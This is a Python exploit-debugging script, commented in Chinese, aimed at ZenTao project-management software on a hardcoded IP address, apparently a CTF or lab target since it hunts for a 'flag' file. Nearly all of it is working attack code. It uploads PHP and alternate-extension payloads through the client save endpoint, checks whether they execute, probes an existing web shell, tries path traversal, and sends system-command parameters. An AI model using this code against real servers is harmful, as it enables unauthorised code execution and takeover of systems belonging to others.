#!/usr/bin/env python3
"""
调试禅道漏洞 - 检查文件实际内容
"""

import requests
import base64

requests.packages.urllib3.disable_warnings()

def test_upload_and_verify():
    """测试上传并验证文件内容"""
    base_url = "http://47.113.178.182:32829"

    print("[*] 测试文件上传和验证\n")

    # 测试 1: 上传简单的 HTML
    print("=" * 70)
    print("测试 1: 上传纯文本 HTML")
    print("=" * 70)

    test_content = "<h1>TEST HTML</h1>"
    encoded = base64.b64encode(test_content.encode()).decode()

    filename = "test1.html"
    upload_url = f"{base_url}/zentao/index.php?m=client&f=save&t=txt&fileName={filename}"

    resp = requests.post(upload_url, data=encoded, timeout=10)
    print(f"上传状态: {resp.status_code}")

    file_url = f"{base_url}/zentao/data/client/1/{filename}"
    resp = requests.get(file_url, timeout=10)
    print(f"访问状态: {resp.status_code}")
    print(f"文件内容: {resp.text}")
    print(f"内容长度: {len(resp.content)} bytes")

    # 测试 2: 上传简单的 PHP echo
    print("\n" + "=" * 70)
    print("测试 2: 上传简单的 PHP echo")
    print("=" * 70)

    test_php = "<?php echo 'PHP_WORKS'; ?>"
    encoded = base64.b64encode(test_php.encode()).decode()

    filename = "test2.php"
    upload_url = f"{base_url}/zentao/index.php?m=client&f=save&t=txt&fileName={filename}"

    resp = requests.post(upload_url, data=encoded, timeout=10)
    print(f"上传状态: {resp.status_code}")

    file_url = f"{base_url}/zentao/data/client/1/{filename}"
    resp = requests.get(file_url, timeout=10)
    print(f"访问状态: {resp.status_code}")
    print(f"文件内容: '{resp.text}'")
    print(f"内容长度: {len(resp.content)} bytes")

    if "PHP_WORKS" in resp.text:
        print("✓ PHP 可以执行!")
    else:
        print("✗ PHP 没有执行或被禁用")

    # 测试 3: 检查现有的 shell.php
    print("\n" + "=" * 70)
    print("测试 3: 检查原有的 shell.php")
    print("=" * 70)

    shell_url = f"{base_url}/zentao/data/client/1/shell.php"
    resp = requests.get(shell_url, timeout=10)
    print(f"访问状态: {resp.status_code}")
    print(f"Content-Type: {resp.headers.get('Content-Type', 'N/A')}")
    print(f"内容长度: {len(resp.content)} bytes")

    # 尝试用 view-source
    resp_source = requests.get(shell_url, headers={'Accept': 'text/plain'}, timeout=10)
    print(f"纯文本内容: '{resp_source.text[:100]}'")

    # 测试 4: 尝试不同的文件扩展名
    print("\n" + "=" * 70)
    print("测试 4: 尝试不同的文件扩展名")
    print("=" * 70)

    test_php = "<?php echo 'TEST'; ?>"
    encoded = base64.b64encode(test_php.encode()).decode()

    for ext in ['txt', 'html', 'phtml', 'php3', 'php5']:
        filename = f"test.{ext}"
        upload_url = f"{base_url}/zentao/index.php?m=client&f=save&t=txt&fileName={filename}"

        requests.post(upload_url, data=encoded, timeout=10)

        file_url = f"{base_url}/zentao/data/client/1/{filename}"
        resp = requests.get(file_url, timeout=10)

        print(f"  {ext}: 状态={resp.status_code}, 长度={len(resp.content)}, 内容='{resp.text[:50]}'")

    # 测试 5: 检查目录列表
    print("\n" + "=" * 70)
    print("测试 5: 尝试目录列表")
    print("=" * 70)

    dir_url = f"{base_url}/zentao/data/client/1/"
    resp = requests.get(dir_url, timeout=10)
    print(f"目录访问状态: {resp.status_code}")
    if resp.status_code == 200:
        print(f"内容预览: {resp.text[:300]}")


def try_direct_command():
    """尝试直接通过 URL 参数执行"""
    base_url = "http://47.113.178.182:32829"

    print("\n" + "=" * 70)
    print("尝试直接命令执行")
    print("=" * 70)

    # 测试是否有直接的命令执行点
    test_urls = [
        f"{base_url}/zentao/index.php?m=client&f=save&t=txt&fileName=../../flag",
        f"{base_url}/zentao/data/client/1/shell.php?cmd=phpinfo()",
        f"{base_url}/zentao/api.php?cmd=system('ls')",
    ]

    for url in test_urls:
        print(f"\n[*] 测试: {url}")
        try:
            resp = requests.get(url, timeout=10)
            if resp.status_code == 200 and len(resp.content) > 10:
                print(f"    状态: {resp.status_code}")
                print(f"    内容: {resp.text[:200]}")
        except Exception as e:
            print(f"    错误: {e}")


def main():
    print("""
╔═══════════════════════════════════════════════════════════════╗
║      禅道漏洞调试 - 检查文件上传和执行                       ║
╚═══════════════════════════════════════════════════════════════╝
    """)

    test_upload_and_verify()
    try_direct_command()


if __name__ == "__main__":
    main()
